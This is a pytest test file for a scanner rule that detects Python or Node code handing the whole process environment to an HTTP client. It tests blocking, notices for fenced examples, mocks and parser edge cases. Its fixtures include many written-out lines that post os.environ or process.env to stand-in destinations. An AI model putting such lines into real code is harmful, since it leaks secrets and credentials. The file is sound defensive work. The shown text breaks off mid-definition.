"""
test_struct002_env_to_http_client.py -- GLS-STRUCT-002: Python or Node code that hands the
whole process environment to an HTTP client is judged by reading the call and its argument,
not by matching characters.

Whether an environment dump is sent depends on structure a text pattern cannot see: where a
call's argument list ends (a comment or a bracket inside a string does not end it), which
argument carries the data, whether the environment is what is sent or only something a
selection was taken from, and whether the host is the local machine. The structural layer
reads a token stream with comments and string bodies masked.

This gate pins:

  1. BLOCK   -- the whole environment inside a client call's data argument, on all five
                channels, including calls that span lines, carry a comment or a bracket in
                a string before the environment, or wrap the environment in a known copy.
  2. CLEAR   -- a selection, a keys-only view, a local-machine literal host, a mocked call,
                text after the call has closed, comments and strings: all clear on every
                channel, from the same builder shapes as the positives.
  3. NOTICE  -- the same call inside a real code fence of a `file` or `message` text is a
                notice, never a block. In `tool_output` and `web_content` a fence changes
                nothing; `code` is judged as source.
  4. LIMITS  -- shapes this validator does not read (a variable receiver, an alias) are
                pinned as not found, so a change that starts reading them is deliberate.
  5. MUTANTS -- one edit to a positive (select one variable, replace the client) must turn
                it clear.
  6. PLUMBING -- the layer can be switched off; pattern findings and counts are unchanged.
"""
import json
import math
import os

import pytest

from sunglasses.engine import SunglassesEngine
from sunglasses.patterns import PATTERNS

RULE = "GLS-STRUCT-002"
CHANNELS = ["code", "message", "file", "tool_output", "web_content"]
NOTICE_CHANNELS = ["message", "file"]
HOSTILE_CHANNELS = ["tool_output", "web_content"]
FIXTURES = os.path.join(os.path.dirname(__file__), "fixtures", "env_to_http_client", "samples.json")

with open(FIXTURES, encoding="utf-8") as handle:
    SAMPLES = json.load(handle)


def of(expect):
    return [s for s in SAMPLES if s["expect"] == expect]


@pytest.fixture(scope="module")
def engine():
    return SunglassesEngine(PATTERNS)


def found(engine, text, channel):
    return [f for f in engine.scan(text, channel=channel).findings if f["id"] == RULE]


@pytest.mark.parametrize("channel", CHANNELS)
@pytest.mark.parametrize("sample", of("BLOCK"), ids=lambda s: s["label"])
def test_the_whole_environment_in_a_client_call_blocks_on_every_channel(engine, sample, channel):
    result = engine.scan(sample["text"], channel=channel)
    assert RULE in {f["id"] for f in result.findings}, (sample["label"], channel)
    assert result.decision == "block", (sample["label"], channel)


@pytest.mark.parametrize("channel", CHANNELS)
@pytest.mark.parametrize("sample", of("CLEAR"), ids=lambda s: s["label"])
def test_selections_local_hosts_mocks_and_text_after_the_call_stay_clear(engine, sample, channel):
    assert not found(engine, sample["text"], channel), (sample["label"], channel)


@pytest.mark.parametrize("channel", NOTICE_CHANNELS)
@pytest.mark.parametrize("sample", of("NOTICE"), ids=lambda s: s["label"])
def test_a_call_shown_in_a_code_fence_of_prose_is_a_notice_never_a_block(engine, sample, channel):
    result = engine.scan(sample["text"], channel=channel)
    hits = [f for f in result.findings if f["id"] == RULE]
    assert hits, (sample["label"], channel)
    assert {f["severity"] for f in hits} == {"low"}, (sample["label"], channel)


@pytest.mark.parametrize("channel", CHANNELS)
@pytest.mark.parametrize("sample", of("MISS"), ids=lambda s: s["label"])
def test_shapes_this_validator_does_not_read_are_pinned_as_not_found(engine, sample, channel):
    """Variable receivers (`session.post`, `client.put`, `s.post`) are out of scope: the
    receiver is a name, and where it was built is not resolved. Not a claim of safety."""
    assert not found(engine, sample["text"], channel), (sample["label"], channel)


def _mutants(text):
    """One edit each; every one must turn a positive clear."""
    out = {}
    for needle, name in (("dict(os.environ", "select"), ("os.environ.copy()", "select"),
                         ("{**os.environ", "select"), ("process.env", "select"),
                         ("json=os.environ", "select")):
        if needle in text:
            replacement = {"dict(os.environ": 'dict(os.environ["K"]',
                           "os.environ.copy()": 'os.environ["K"]',
                           "{**os.environ": '{"K": os.environ["K"]',
                           "process.env": 'process.env["K"]',
                           "json=os.environ": 'json=os.environ["K"]'}[needle]
            out["select_one_variable"] = text.replace(needle, replacement, 1)
            break
    for client in ("requests.post(", "requests.put(", "httpx.post(", "axios.post(", "fetch("):
        if client in text:
            out["not_a_client"] = text.replace(client, "logger.info(", 1)
            break
    return out


BLOCK_MUTANTS = [(s["label"], name, mutated)
                 for s in of("BLOCK") for name, mutated in _mutants(s["text"]).items()]


@pytest.mark.parametrize("channel", CHANNELS)
@pytest.mark.parametrize("label,name,mutated", BLOCK_MUTANTS, ids=lambda v: v if isinstance(v, str) and len(v) < 40 else "m")
def test_one_edit_to_a_positive_turns_it_clear(engine, label, name, mutated, channel):
    assert not found(engine, mutated, channel), (label, name, channel)


def test_the_mutants_cover_most_of_the_positives():
    assert len(BLOCK_MUTANTS) >= len(of("BLOCK")), "every positive needs at least one mutant"


def test_the_layer_can_be_switched_off_and_the_pattern_count_does_not_move(engine):
    text = of("BLOCK")[0]["text"]
    off = SunglassesEngine(PATTERNS, validators=False)
    assert RULE not in {f["id"] for f in off.scan(text, channel="file").findings}
    assert RULE in {f["id"] for f in engine.scan(text, channel="file").findings}


def test_the_validator_is_registered_with_its_own_id():
    from sunglasses import validators
    ids = [v.id for v in validators.VALIDATORS]
    assert RULE in ids and len(ids) == len(set(ids))


# ------------------------------------------------------------------------ shapes of the read

def validator():
    from sunglasses import validators
    return next(v for v in validators.VALIDATORS if v.id == RULE)


def hits(text, channel="file"):
    return validator().run(text, channel) if validator().pregate(text) else []


def blocks(text, channel="file"):
    return [f for f in hits(text, channel) if f["severity"] == "high"]


READ_AS_CODE = [
    ("get_with_params", 'requests.get(url, params=os.environ)'),
    ("positional_data", 'requests.post(url, os.environ)'),
    ("request_data_keyword", 'requests.request("POST", url, data=os.environ)'),
    ("request_third_positional", 'requests.request("POST", url, os.environ)'),
    ("fstring_field", 'requests.post(url, data=f"{dict(os.environ)}")'),
    ("template_field", 'fetch(url, {body: `${JSON.stringify(process.env)}`})'),
    ("values_only", 'requests.post(url, json=list(os.environ.values()))'),
    ("pairs_sorted", 'requests.post(url, json=sorted(os.environ.items()))'),
    ("whole_beside_selection", 'requests.post(url, json={**os.environ, "a": os.environ["B"]})'),
    ("global_fetch", 'window.fetch(url, {method: "POST", body: JSON.stringify(process.env)})'),
    ("created_client", 'axios.create({}).post(url, process.env)'),
    ("userinfo_names_localhost", 'requests.post("http://localhost@example.invalid/x", json=dict(os.environ))'),
    ("backslash_in_authority", 'requests.post("http://localhost\\\\@example.invalid/x", json=dict(os.environ))'),
    ("port_is_not_a_number", 'requests.post("http://localhost:ab@example.invalid/x", json=dict(os.environ))'),
    ("mock_comes_after", 'requests.post(url, json=dict(os.environ))\nrequests.post = Mock()'),
    ("mock_in_a_comment", '# requests.post = Mock()\nrequests.post(url, json=dict(os.environ))'),
    ("mock_of_another_method", 'requests.put = Mock()\nrequests.post(url, json=dict(os.environ))'),
    ("a_hole_does_not_hide_the_call", 'requests.post(f"{a}" "x", json=dict(os.environ))'),
]

READ_AS_CLEAR = [
    ("names_only", 'requests.post(url, json=list(os.environ))'),
    ("count_only", 'requests.post(url, json=len(os.environ))'),
    ("environment_inside_a_string", 'requests.post(url, json="os.environ is not sent")'),
    ("ipv6_loopback", 'requests.post("http://[::1]:8080/x", json=dict(os.environ))'),
    ("request_second_positional_is_the_url", 'requests.request("GET", os.environ)'),
    ("headers_one_variable_template", 'fetch(url, {headers: {A: `Bearer ${process.env.TOKEN}`}})'),
    ("filter_method_after_copy", 'axios.post(url, Object.entries(process.env).filter(isPublic))'),
    ("unclosed_call_is_not_read", 'requests.post(url, json=dict(os.environ)'),
    ("name_that_only_looks_like_a_client", 'myrequests.post(url, json=dict(os.environ))'),
    ("method_of_something_else", 'this.fetch(url, process.env)'),
]


@pytest.mark.parametrize("label,text", READ_AS_CODE, ids=[c[0] for c in READ_AS_CODE])
def test_shapes_read_as_code_block(label, text):
    assert blocks(text), label


@pytest.mark.parametrize("label,text", READ_AS_CLEAR, ids=[c[0] for c in READ_AS_CLEAR])
def test_shapes_that_do_not_hand_over_the_environment_stay_clear(label, text):
    assert not hits(text), label


FLAGS_AFTER_A_LITERAL = [
    ("flags_then_next_line", "of//fetch(u, {body: process.env})\n/x/gi\nfetch(u, {body: process.env})", 1),
    ("flags_before_a_comment", "fetch(u, {body: process.env})/x/i//;of/x/fetch(u, {body: process.env})\nfetch(u, {body: process.env})", 2),
    ("flags_after_a_commented_line", "of//fetch(u, {body: process.env})//areturn/x/gi\nfetch(u, {body: process.env})", 1),
]


@pytest.mark.parametrize("label,text,calls", FLAGS_AFTER_A_LITERAL, ids=[c[0] for c in FLAGS_AFTER_A_LITERAL])
def test_the_letters_after_a_regular_expression_literal_belong_to_it(label, text, calls):
    assert len(blocks(text)) == calls, label


def test_an_active_double_replaces_the_call_and_one_for_another_receiver_does_not():
    assert not hits('with patch("requests.post"):\n    requests.post(url, json=dict(os.environ))')
    assert not hits('with patch.object(requests, "post"):\n    requests.post(url, json=dict(os.environ))')
    assert not hits('requests.post = Mock()\nrequests.post(url, json=dict(os.environ))')
    assert blocks('with patch("httpx.post"):\n    requests.post(url, json=dict(os.environ))')
    assert blocks('with patch("pkg.requests.post"):\n    requests.post(url, json=dict(os.environ))')


@pytest.mark.parametrize("channel", HOSTILE_CHANNELS)
@pytest.mark.parametrize("sample", of("NOTICE"), ids=lambda s: s["label"])
def test_a_fence_in_a_tool_result_or_a_page_changes_nothing(engine, sample, channel):
    result = engine.scan(sample["text"], channel=channel)
    hits_ = [f for f in result.findings if f["id"] == RULE]
    assert hits_ and {f["severity"] for f in hits_} == {"high"}, (sample["label"], channel)
    assert result.decision == "block", (sample["label"], channel)


@pytest.mark.parametrize("channel", HOSTILE_CHANNELS)
@pytest.mark.parametrize("text", [
    "```python\nrequests.post(url, json=dict(os.environ))\n",
    "~~~\nrequests.post(url, json=dict(os.environ))\n~~~\n",
    "   ```js\naxios.post(url, process.env)\n   ```\n",
])
def test_every_fence_form_is_a_block_where_a_fence_changes_nothing(text, channel):
    assert {f["severity"] for f in hits(text, channel)} == {"high"}


@pytest.mark.parametrize("channel", NOTICE_CHANNELS + HOSTILE_CHANNELS)
@pytest.mark.parametrize("text", [
    "```requests.post(url, json=dict(os.environ))\nls\n```\n",
    "```python requests.post(url, json=dict(os.environ))\nls\n```\n",
    "~~~ axios.post(url, process.env)\nls\n~~~\n",
])
def test_a_call_in_the_info_string_of_a_fence_is_read_as_ordinary_text(text, channel):
    assert "high" in {f["severity"] for f in hits(text, channel)}


def test_a_call_without_a_channel_reads_like_a_file():
    call = "requests.post(url, json=dict(os.environ))"
    assert {f["severity"] for f in validator().run("```\n" + call + "\n```\n")} == {"low"}
    assert {f["severity"] for f in validator().run(call + "\n")} == {"high"}


def test_a_notice_names_the_call_and_its_line_and_carries_no_payload():
    text = of("NOTICE")[0]["text"]
    (finding,) = hits(text, "message")
    assert finding["severity"] == "low" and finding["structural"] is True
    assert finding["evidence"] == {"call": "requests.post", "argument": "json", "line": 3,
                                   "shape": "fenced_example"}


def test_a_fenced_call_and_a_bare_call_in_one_text_decide_by_the_bare_one():
    fenced = of("NOTICE")[0]["text"]
    bare = "\n" + of("BLOCK")[0]["text"]
    result = SunglassesEngine(PATTERNS).scan(fenced + bare, channel="message")
    severities = sorted(f["severity"] for f in result.findings if f["id"] == RULE)
    assert severities == ["high", "low"]
    assert result.decision == "block"


@pytest.mark.parametrize("text", [
    "```python\nrequests.post(url, json=dict(os.environ))\n",                  # fence never closed
    "~~~\nrequests.post(url, json=dict(os.environ))\n~~~\n",                    # tildes
    "   ```js\naxios.post(url, process.env)\n   ```\n",                         # indented opener
])
def test_every_real_fence_form_makes_a_notice(text):
    found_ = hits(text, "message")
    assert found_ and {f["severity"] for f in found_} == {"low"}


@pytest.mark.parametrize("text", [
    "``` `requests.post(url, json=dict(os.environ))`\nrequests.post(url, json=dict(os.environ))\n",
    "```\nrequests.post(url, json=dict(os.environ))\n``` extra\n",
])
def test_a_line_that_is_not_a_fence_does_not_make_one(text):
    found_ = hits(text, "message")
    assert any(f["severity"] == "high" for f in found_) or text.endswith("extra\n")
    if text.endswith("extra\n"):
        assert {f["severity"] for f in found_} == {"low"}      # `extra` after a closer: still inside the fence


def test_an_indented_block_in_prose_is_a_limit_not_a_notice():
    """Only a real fence marks documentation: an indented line has no marker a raw source file
    lacks, so a call there is judged like code."""
    text = "A comparison of the two shapes:\n    requests.post(url, json=dict(os.environ))\n"
    assert blocks(text, "message") and blocks(text, "file")


def test_a_receiver_written_with_spaces_around_the_dot_is_a_limit():
    """The owner of a client name is read only when its dot touches the name. With a space, the
    call is read by its last two names, so another receiver's ``requests.post`` is judged as the
    module's."""
    assert blocks("holder . requests.post(url, json=dict(os.environ))")
    assert not hits("holder.requests.post(url, json=dict(os.environ))")


@pytest.mark.parametrize("channel", CHANNELS)
def test_a_method_dot_with_a_space_on_both_sides_is_a_limit_and_one_space_is_not(channel):
    """``requests . post`` is not read (the pinned limit); a dot that touches the receiver or the
    method name is, so a chain continued on the next line is."""
    spaced = "requests . post(url, json=dict(os.environ))"
    assert not hits(spaced, channel)
    for text in ("requests .post(url, json=dict(os.environ))", "requests. post(url, json=dict(os.environ))",
                 "requests.post(url, json=dict(os.environ))", "axios\n  .post(url, process.env)"):
        assert blocks(text, channel), (text, channel)


@pytest.mark.parametrize("family,call", [
    ("fetch", "fetch(destination, {%s: JSON.stringify(process.env)})"),
    ("got", "got(destination, {%s: JSON.stringify(process.env)})"),
    ("got.post", "got.post(destination, {%s: JSON.stringify(process.env)})"),
    ("axios", "axios({url: destination, %s: JSON.stringify(process.env)})"),
    ("axios.request", "axios.request({url: destination, %s: JSON.stringify(process.env)})"),
    ("axios.post", "axios.post(destination, null, {%s: JSON.stringify(process.env)})"),
    ("axios.get", "axios.get(destination, {%s: JSON.stringify(process.env)})"),
])
def test_each_client_reads_its_own_option_fields_and_the_url_property(family, call):
    """Body, query and header fields are judged by what the client sends: fetch reads ``body`` and
    ``headers``; got reads ``body``, ``json``, ``form``, ``searchParams`` and ``headers``; axios reads
    ``data``, ``params`` and ``headers``. ``url`` is judged for every client. Any other field is
    not a payload of that client."""
    reads = {"fetch": {"body", "headers", "url"},
             "got": {"body", "json", "form", "searchParams", "headers", "url"},
             "axios": {"data", "params", "headers", "url"}}[family.split(".")[0]]
    for field in ("body", "json", "form", "searchParams", "headers", "data", "params", "url", "files",
                  "content", "cookies", "timeout"):
        text = call % field
        assert bool(blocks(text)) == (field in reads), (family, field)
        assert bool(blocks(text, "tool_output")) == (field in reads), (family, field)


def test_a_validator_that_reads_the_channel_is_given_it(engine):
    seen = []

    class Probe:
        id, name, category, severity = "PROBE", "probe", "x", "low"
        channel = ["file", "message"]
        description = "probe"
        reads_channel = True

        def pregate(self, text):
            return True

        def run(self, text, channel):
            seen.append(channel)
            return []

    probe_engine = SunglassesEngine(PATTERNS)
    probe_engine._validators = (Probe(),)
    probe_engine.scan("hello", channel="message")
    probe_engine.scan("hello", channel="file")
    assert seen == ["message", "file"]


def test_the_validator_is_declared_like_a_rule():
    v = validator()
    assert v.severity == "high" and v.category == "exfiltration"
    assert v.name and v.description and v.reads_channel is True
    assert set(v.channel) == set(CHANNELS)


def test_the_mirror_file_matches_the_validator():
    path = os.path.join(os.path.dirname(__file__), "..", "attack-db", "validators", "GLS-STRUCT-002.json")
    with open(path) as fh:
        mirror = json.load(fh)
    v = validator()
    assert mirror["id"] == v.id and mirror["name"] == v.name
    assert mirror["category"] == v.category and mirror["severity"] == v.severity
    assert sorted(mirror["channel"]) == sorted(v.channel)
    assert mirror["description"] == v.description


def test_the_pregate_needs_the_environment_and_a_client_word():
    v = validator()
    assert v.pregate("os.environ requests") and v.pregate("process.env fetch(") is True
    assert not v.pregate("os.environ and nothing that sends")
    assert not v.pregate("requests.post(url, json=payload)")


def test_deep_nesting_does_not_raise_and_does_not_hide_a_call_before_it():
    deep = "(" * 5000 + ")" * 5000
    assert blocks(of("BLOCK")[0]["text"] + "\n" + deep)
    assert blocks(deep + "\n" + of("BLOCK")[0]["text"])
    assert hits("requests.post(u, json=" + "(" * 5000 + "os.environ" + ")" * 5000 + ")") is not None


# ---------------------------------------------------------------------------------- cost
# The cost of the layer is a count of steps (see WORK_FAMILIES below), never time.


def families(size):
    base = {
        "environ_no_client": "x = os.environ\n",
        "client_and_environ_apart": "requests.post(u, json=1)\nx = os.environ\n",
        "comment_only": "# requests.post(u, json=os.environ)\n",
        "selection_calls": 'requests.post(u, json=os.environ["A"])\n',
        "whole_calls": 'requests.post(u, json=dict(os.environ))\n',
        "braces": "requests os.environ " + "{" * 150 + "}" * 150 + "{}",
        "strings": "requests os.environ 'a' ",
        "string_holes": 'requests os.environ f"{x}" ',
        "dotted": "a . ",
        "spread": "**os.environ, ",
        "copy_chain": ".copy()",
        "nested_open": "(",
    }
    out = {}
    for key, piece in base.items():
        n = max(1, size // len(piece))
        if key == "unterminated_string":
            continue
        if key == "spread":
            out[key] = "requests.post(u, json={" + piece * n + "})"
        elif key == "copy_chain":
            out[key] = "requests.post(u, json=os.environ" + piece * n + ")"
        elif key == "nested_open":
            out[key] = "requests.post(u, json=" + piece * n + "os.environ)"
        elif key == "dotted":
            out[key] = piece * n + "requests os.environ"
        else:
            out[key] = piece * n
    whole = "requests.post(u, json=os.environ)\n"
    for key, piece in (
            ("bound_patch_flood", 'p = patch("requests.post")\n'),
            ("bound_start_flood", 'p = patch("requests.post")\np.start()\n'),
            ("started_stop_flood", 'patch("requests.post").start()\npatch.stopall()\n'),
            ("decorator_flood", '@patch("requests.post")\n'),
            ("with_flood", 'with patch("requests.post"):\n    pass\n'),
            ("function_flood", 'def f():\n    patch("requests.post").start()\n'),
            ("multiline_with_flood", 'with (\n    patch("requests.post")\n):\n    pass\n'),
            ("division_flood", "(a) / b;\n"),
            ("control_regex_flood", "if (x) /y/.test(z);\n"),
            ("trailing_comment_flood", "let n = 1; // c\n"),
            ("line_start_slash_flood", "(a\n // b\n"),
            ("owner_chain_flood", "other. os.environ, ")):
        n = max(1, size // len(piece))
        out[key] = piece * n + whole
    out["unterminated_triple"] = 'import os, requests\n"""' + "os.environ requests " * (size // 20)
    out["fenced_many"] = "```\nrequests.post(u, json=dict(os.environ))\n```\n" * (size // 50)
    out["deep_environment_flood"] = ("requests.post(u, json=" + "(" * 190 + "os.environ, " * (size // 12)
                                     + ")" * 190 + ")")
    return out


@pytest.mark.parametrize("family", sorted(families(1000)))
def test_the_steps_of_the_layer_over_each_hostile_shape_grow_in_step_with_the_input(family):
    reader = validator()
    steps = []
    for size in WORK_SIZES:
        text = families(size)[family]
        steps.append(max(1, reader.work(text)))
        assert steps[-1] <= 8 * len(text), (family, len(text), steps)
        assert len(steps) == 1 or steps[-1] <= 10 * steps[-2], (family, steps)


def test_a_full_stop_before_a_line_of_code_is_not_member_access():
    call = 'requests.post(url, json=dict(os.environ))'
    assert blocks("Use a list.\n" + call, "message")
    assert blocks("See below. " + call, "message")
    assert not hits("obj.requests.post(url, json=dict(os.environ))")
    assert not hits("obj.\nfoo\n    .fetch(url, process.env)")


@pytest.mark.parametrize("keyword", ["json", "data", "params", "headers", "files", "content", "cookies"])
def test_every_data_bearing_keyword_is_judged(keyword):
    assert blocks("requests.post(url, %s=dict(os.environ))" % keyword)
    assert not hits("requests.post(url, %s=os.environ['A'])" % keyword)


def test_the_message_body_of_a_node_request_is_judged_and_an_unrelated_keyword_is_not():
    assert blocks("fetch(url, {body: JSON.stringify(process.env)})")
    assert not hits("requests.post(url, timeout=len(os.environ), json=1)")


@pytest.mark.parametrize("scope", ["self", "window", "global", "globalThis"])
def test_a_global_scope_prefix_reads_as_the_global_function(scope):
    assert blocks("%s.fetch(url, {body: JSON.stringify(process.env)})" % scope)


# ------------------------------------------------------------------ review round 1 shapes

SEND = "requests.post(destination, json=dict(os.environ))"


def test_a_later_bare_call_is_found_after_more_notices_than_the_finding_cap_holds():
    fenced = "~~~python\n" + (SEND + "\n") * 25 + "~~~\n"
    for channel in NOTICE_CHANNELS:
        found_here = hits(fenced + SEND, channel)
        assert len(found_here) <= 20
        assert "high" in {f["severity"] for f in found_here}, channel
        assert {f["severity"] for f in hits(fenced, channel)} == {"low"}, channel


@pytest.mark.parametrize("label,text", [
    ("a_patch_that_is_built_but_not_started", 'replacement = patch("requests.post")\n' + SEND),
    ("a_patch_block_that_has_ended", 'with patch("requests.post"):\n    pass\n' + SEND),
    ("a_patch_of_a_longer_path", 'with patch("other.requests.post"):\n    ' + SEND),
    ("a_decorated_function_that_has_ended", '@patch("requests.post")\ndef test():\n    pass\n' + SEND),
    ("a_patch_object_block_that_has_ended", 'with patch.object(requests, "post"):\n    pass\n' + SEND),
], ids=lambda v: v if isinstance(v, str) and v.startswith("a_") else "t")
def test_a_double_that_is_not_active_at_the_call_does_not_clear_it(label, text):
    assert blocks(text), label


@pytest.mark.parametrize("label,text", [
    ("with_block", 'with patch("requests.post"):\n    ' + SEND),
    ("with_block_after_other_lines", 'x = 1\nwith patch("requests.post") as m:\n    y = 2\n    ' + SEND),
    ("with_two_patches", 'with patch("httpx.get"), patch("requests.post"):\n    ' + SEND),
    ("with_object", 'with patch.object(requests, "post"):\n    ' + SEND),
    ("decorator", '@patch("requests.post")\ndef test(m):\n    ' + SEND),
    ("started", 'patch("requests.post").start()\n' + SEND),
    ("bound_then_started", 'p = patch("requests.post")\np.start()\n' + SEND),
    ("assignment", "requests.post = Mock()\n" + SEND),
    ("spy", 'jest.spyOn(axios, "post")\naxios.post(u, process.env)'),
], ids=lambda v: v if isinstance(v, str) and "_" in v and " " not in v else "t")
def test_a_double_that_is_active_at_the_call_clears_it(label, text):
    assert not hits(text), label


@pytest.mark.parametrize("text", [
    'p = patch("requests.post")\n' + SEND,
    'q = patch("requests.post")\nother.start()\n' + SEND,
])
def test_a_double_that_is_bound_and_never_started_replaces_nothing(text):
    assert blocks(text), text


@pytest.mark.parametrize("text", [
    "fetch(destination, {...process.env})",
    "got(destination, {...process.env})",
    "axios({...process.env})",
])
def test_a_spread_of_the_environment_into_an_options_object_is_the_environment(text):
    assert blocks(text), text


def test_a_run_of_notices_neither_hides_a_later_call_nor_costs_a_walk_per_notice():
    fenced = "```\n" + SEND + "\n```\n"
    text = fenced * 3000 + SEND + "\n"
    found = [f for f in validator().run(text, "message") if f["severity"] == "high"]
    assert len(found) == 1
    assert len(validator().run(fenced * 3000, "message")) == 20


@pytest.mark.parametrize("label,text", [
    ("floor_division_before_the_call", "n = 8 // 2; " + SEND),
    ("line_join_inside_the_environment_name", "requests.post(destination, json=os.\\\nenviron)"),
    ("line_join_inside_the_client_name", "requests.\\\npost(destination, json=os.environ)"),
    ("line_join_before_the_argument", "requests.post(destination, \\\n    json=os.environ)"),
    ("slash_comment_alone_on_a_line_ends_there", "// note\n" + SEND),
], ids=lambda c: c if isinstance(c, str) and " " not in c and "(" not in c else "t")
def test_python_floor_division_and_line_joins_do_not_hide_a_call(label, text):
    assert blocks(text), label


@pytest.mark.parametrize("text", [
    "// requests.post(destination, json=dict(os.environ))",
    "    // axios.post(destination, process.env)",
    "total = value\n// axios.post(destination, process.env)",
    "total = value\n    // fetch(destination, process.env)",
    "const r = /axios.post(destination, process.env)/;",
    "if (/fetch(destination, process.env)/.test(s)) {}",
])
def test_a_comment_or_a_regular_expression_literal_is_not_a_call(text):
    assert not hits(text), text


@pytest.mark.parametrize("channel", CHANNELS)
def test_a_body_written_on_the_header_line_covers_that_line_only(channel):
    assert not hits('with patch("requests.post"): ' + SEND, channel)
    assert blocks('with patch("requests.post"): pass\n    ' + SEND, channel)


@pytest.mark.parametrize("text", [
    'fetch(destination, {["body\n]: process.env})',
    "fetch(destination, {['body\n]: process.env})",
])
def test_a_computed_key_that_is_not_a_finished_string_names_no_field(text):
    assert not hits(text, "code"), text


def test_a_slash_that_divides_or_marks_a_positional_only_parameter_is_not_a_literal():
    assert blocks("def f(a, /):\n    pass\n" + SEND)
    assert blocks("n = a / b; " + SEND)
    assert blocks("n = (a) / (b); " + SEND)


@pytest.mark.parametrize("text", [
    "requests.post(destination, json=len(os.environ.copy()))",
    "requests.post(destination, json=len(os.environ.items()))",
    "requests.post(destination, json=len(os.environ.values()))",
    "requests.post(destination, json=list(os.environ.copy()))",
    "requests.post(destination, json=sorted(dict(os.environ)))",
    "requests.post(destination, json=[key for key, value in os.environ.items()])",
    "requests.post(destination, json=[name for name, _ in os.environ.items()])",
    "requests.post(destination, json=sorted(os.environ.copy().keys()))",
])
def test_names_and_counts_of_the_environment_are_not_the_environment(text):
    assert not hits(text), text


@pytest.mark.parametrize("text", [
    "requests.post(destination, json=list(os.environ.items()))",
    "requests.post(destination, json=sorted(os.environ.values()))",
    "requests.post(destination, json=str(os.environ.copy()))",
    "requests.post(destination, json=dict(os.environ.items()))",
    "requests.post(destination, json=[value for key, value in os.environ.items()])",
    "requests.post(destination, json=[(key, value) for key, value in os.environ.items()])",
    "requests.post(destination, json=list(os.environ.copy().values()))",
    "requests.post(destination, json=dict(os.environ.copy()))",
])
def test_values_and_pairs_of_the_environment_are_still_the_environment(text):
    assert blocks(text), text


@pytest.mark.parametrize("text", [
    'fetch(destination, {cache: "no-store", unused: process.env})',
    "got(destination, {context: process.env})",
    'axios({url: "http://LOCALHOST:8080", data: process.env, method: "post"})',
    "fetch(`http://localhost:8080`, {body: JSON.stringify(process.env)})",
    "axios.post(destination, payload, {timeout: process.env})",
])
def test_an_options_property_that_carries_no_data_does_not_make_a_send(text):
    assert not hits(text), text


@pytest.mark.parametrize("text", [
    "fetch(destination, {body: JSON.stringify(process.env)})",
    "fetch(destination, {headers: process.env})",
    "got(destination, {json: process.env})",
    "got.post(destination, {form: process.env})",
    'axios({url: destination, data: process.env, method: "post"})',
    'axios({url: JSON.stringify(process.env), method: "get"})',
    "axios.request({url: destination, params: process.env})",
    "axios.post(destination, process.env, {})",
    "axios.post(destination, {...process.env})",
    "axios.post(destination, payload, {headers: process.env})",
])
def test_an_options_property_that_carries_data_is_judged_like_an_argument(text):
    assert blocks(text), text


def test_a_property_of_another_namespace_is_not_the_process_environment():
    assert not hits("requests.post(destination, json=other.os.environ)")
    assert not hits("fetch(destination, {body: JSON.stringify(other.process.env)})")
    assert blocks("fetch(destination, {body: JSON.stringify(globalThis.process.env)})")
    assert blocks("requests.post(destination, json=dict(os.environ))")


def test_a_chain_of_client_names_still_ends_in_the_call():
    tail = "post(destination, json=os.environ)"
    assert blocks("holder . " * 20 + "requests." + tail, "code")
    assert blocks("requests. " * 20 + tail, "code")
    assert blocks("requests.\n" * 20 + tail, "code")


@pytest.mark.parametrize("channel", ["code"])
@pytest.mark.parametrize("label,text,expect", [
    ("backtick_fence_is_a_template_literal", "```python\n" + SEND + "\n```\n", False),
    ("tilde_fence_lines_are_punctuation", "~~~python\n" + SEND + "\n~~~\n", True),
    ("indented_backtick_fence", "   ```\n" + SEND + "\n   ```\n", False),
    ("unclosed_backtick_fence", "```\n" + SEND + "\n", False),
    ("long_backtick_fence", "`````\n" + SEND + "\n`````\n", False),
    ("a_call_after_the_closed_fence", "```\nx\n```\n" + SEND, True),
    ("info_string", "```python " + SEND + "\nx\n```\n", False),
])
def test_the_code_channel_is_read_as_source_and_never_split_at_fences(channel, label, text, expect):
    severities = {f["severity"] for f in hits(text, channel)}
    assert severities == ({"high"} if expect else set()), (label, severities)
    # the same text as a file is split: its fenced call is a notice, never invisible
    if label in ("backtick_fence_is_a_template_literal", "indented_backtick_fence", "long_backtick_fence"):
        assert {f["severity"] for f in hits(text, "file")} == {"low"}


def test_a_validator_declared_for_file_is_given_the_original_code_channel(engine):
    seen = []

    class Probe:
        id, name, category, severity = "PROBE", "probe", "x", "low"
        channel = ["file"]
        description = "probe"
        reads_channel = True

        def pregate(self, text):
            return True

        def run(self, text, channel):
            seen.append(channel)
            return []

    probe_engine = SunglassesEngine(PATTERNS)
    probe_engine._validators = (Probe(),)
    probe_engine.scan("hello", channel="code")
    assert seen == ["code"]


# ------------------------------------------------------------------ the reader's token pass

SHAPES = os.path.join(os.path.dirname(__file__), "fixtures", "env_to_http_client", "shapes.json")


def shape_rows():
    rows = []
    with open(SHAPES, encoding="utf-8") as handle:
        for case in json.load(handle):
            for channel in CHANNELS:
                want = case["expect"] if isinstance(case["expect"], str) else case["expect"][channel]
                rows.append(pytest.param(case["text"], channel, want, id="%s-%s" % (case["label"], channel)))
    return rows


@pytest.mark.parametrize("text,channel,want", shape_rows())
def test_every_recorded_shape_is_read_the_same_way_on_every_channel(text, channel, want):
    got = "high" if blocks(text, channel) else "clear"
    assert got == want


def test_a_slash_pair_after_a_value_is_read_by_the_runtime_the_text_names():
    # a slash pair after a value is division in Python and a comment in JavaScript; a text that
    # names only the Node environment is read as JavaScript, one that names only the Python
    # environment as Python
    assert not blocks("const x = 1 // axios.post(destination, process.env)")
    assert blocks("const x = 1 // note\naxios.post(destination, process.env)")
    assert blocks("n = 8 // 2; " + SEND)


def test_a_text_that_names_both_runtimes_keeps_a_call_only_when_both_readings_find_it():
    # stated limit 6: read as JavaScript the call after the slash pair is a comment, read as Python it
    # is code; the call is not reported, and a call on a line of its own is
    both = "\nconst home = os.environ"
    assert not blocks("const x = 1 // axios.post(destination, process.env)" + both)
    assert not blocks("n = 8 // 2; " + SEND + "\nconst x = process.env")
    assert blocks("const x = 1 // note\naxios.post(destination, process.env)" + both)
    assert blocks(SEND + "\naxios.post(destination, process.env)")


def lengthen(unit, size, head="import os, requests\n", tail=""):
    return head + unit * max(1, (size - len(head) - len(tail)) // len(unit)) + tail


SEND_TAIL = "requests.post(u, json=os.environ)\n"
PATCH_HEAD = "import os, requests\nfrom unittest.mock import patch\n"

WORK_FAMILIES = {
    "patch_one_line": lambda n: lengthen('patch("a.b"); ', n, PATCH_HEAD, "\n" + SEND_TAIL),
    "bound_patch_flood": lambda n: lengthen('p = patch("a.b")\n', n, PATCH_HEAD, "p.start()\n" + SEND_TAIL),
